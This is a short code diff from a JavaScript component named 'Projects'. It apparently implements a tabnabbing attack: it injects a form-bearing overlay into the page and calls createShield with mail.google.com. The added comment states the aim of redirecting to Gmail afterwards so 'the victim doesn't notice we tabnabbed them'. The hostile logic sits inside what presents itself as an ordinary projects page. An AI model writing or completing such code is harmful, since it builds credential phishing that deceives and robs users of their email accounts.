@@ -130,11 +130,11 @@ export default function Projects() {
                       </form>
                     </div>
               </body>`
+              //TODO: Afterwards actually route the page to mail.google.com to make sure the victim doesn't notice we tabnabbed them
 
               // div.appendChild(img)
               document.body.appendChild(div)
             }
-
             function changeItUp() {
               if (HAS_SWITCHED == false) {
                 createShield('https://mail.google.com')
